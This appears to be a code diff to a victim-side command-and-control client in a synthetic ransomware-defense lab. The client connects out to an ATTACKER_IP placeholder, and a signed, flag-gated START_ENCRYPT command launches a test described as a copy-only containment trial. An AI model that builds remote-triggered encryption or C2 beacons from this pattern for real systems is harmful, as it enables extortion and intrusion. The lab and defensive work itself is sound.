@@ -1,16 +1,21 @@
 """Victim-side one-command C2 client for the synthetic lab.
 
 Run on victim after Kali server is listening: python3 -m victim.c2_client
-Only records an accepted command; execution wiring comes later.
+With --enable-synthetic-actions, a signed START_ENCRYPT runs the existing
+copy-only containment trial. All other commands remain dry-run.
 """
 
+import argparse
 import socket
+import subprocess
+import sys
+from pathlib import Path
 
-from config import ATTACKER_IP, AUTH_MODE, C2_PORT
+from config import ATTACKER_IP, AUTH_MODE, C2_PORT, PROJECT_ROOT
 from shared.c2_protocol import COMMANDS, log_event, pack, unpack
 
 
-def receive_once():
+def receive_once(*, enable_synthetic_actions=False):
     with socket.create_connection((ATTACKER_IP, C2_PORT), timeout=10) as connection:
         connection.settimeout(180)
         try:
@@ -30,9 +35,47 @@ def receive_once():
             return
         log_event("command_accepted", role="victim", cmd=command,
                   authenticated=message["authenticated"])
+        if command == "START_ENCRYPT" and enable_synthetic_actions:
+            if not AUTH_MODE or not message["authenticated"]:
+                reason = "Synthetic actions require authenticated C2"
+                log_event("command_rejected", role="victim", cmd=command, reason=reason)
+                connection.sendall(pack("REJECT", signed=AUTH_MODE, data={"reason": reason}))
+                print(f"REJECT: {reason}")
+                return
+            try:
+                # This existing test runs only on disposable copies, registers
+                # its own child, and verifies zero real copies before success.
+                completed = subprocess.run(
+                    [sys.executable, "-m", "tests.full_defense_trial"],
+                    cwd=Path(PROJECT_ROOT), capture_output=True, text=True,
+                    timeout=30, check=True)
+                trial_lines = [line.split("Trial evidence: ", 1)[1]
+                               for line in completed.stdout.splitlines()
+                               if line.startswith("Trial evidence: ")]
+                if len(trial_lines) != 1 or "zero real encrypted copies" not in completed.stdout:
+                    raise RuntimeError("Trial did not confirm containment")
+                trial = Path(trial_lines[0]).name
+                log_event("synthetic_action_completed", role="victim", cmd=command,
+                          trial=trial, contained=True)
+                response = {"cmd": command, "executed": True,
+                            "contained": True, "trial": trial}
+                connection.sendall(pack("ACK", signed=True, data=response))
+                print(f"ACK: controlled encryption trial {trial} contained")
+            except (subprocess.CalledProcessError, subprocess.TimeoutExpired,
+                    RuntimeError, OSError) as exc:
+                reason = f"Controlled trial failed: {str(exc)[:160]}"
+                log_event("synthetic_action_failed", role="victim", cmd=command,
+                          reason=reason)
+                connection.sendall(pack("REJECT", signed=True, data={"reason": reason}))
+                print(f"REJECT: {reason}")
+            return
         connection.sendall(pack("ACK", signed=AUTH_MODE, data={"cmd": command, "executed": False}))
         print(f"ACK: {command} accepted (dry run; no action executed)")
 
 
 if __name__ == "__main__":
-    receive_once()
+    parser = argparse.ArgumentParser(description=__doc__)
+    parser.add_argument("--enable-synthetic-actions", action="store_true",
+                        help="Allow signed START_ENCRYPT to run the copy-only containment trial")
+    args = parser.parse_args()
+    receive_once(enable_synthetic_actions=args.enable_synthetic_actions)
